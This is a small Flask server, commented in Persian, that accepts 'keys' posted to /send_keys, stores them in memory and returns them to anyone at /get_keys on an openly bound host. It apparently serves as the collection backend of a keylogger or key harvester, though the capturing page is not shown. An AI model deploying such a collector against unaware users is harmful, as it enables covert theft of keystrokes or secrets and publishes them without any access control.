from flask import Flask, render_template, request, jsonify
import os

app = Flask(__name__)

# لیست ذخیره کلیدها
keys_data = []

@app.route('/')
def index():
    try:
        return render_template('index.html')
    except Exception as e:
        return f"Error loading template: {e}", 500

@app.route('/send_keys', methods=['POST'])
def receive_keys():
    try:
        data = request.json.get('keys')
        if data:
            keys_data.append(data)
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/get_keys', methods=['GET'])
def get_keys():
    return jsonify(keys_data)

if __name__ == '__main__':
    # پورت را از محیط بگیر، اگر نبود پیش فرض 5000
    port = int(os.environ.get("PORT", 5000))
    # host 0.0.0.0 تا از بیرون قابل دسترسی باشد
    app.run(host='0.0.0.0', port=port)
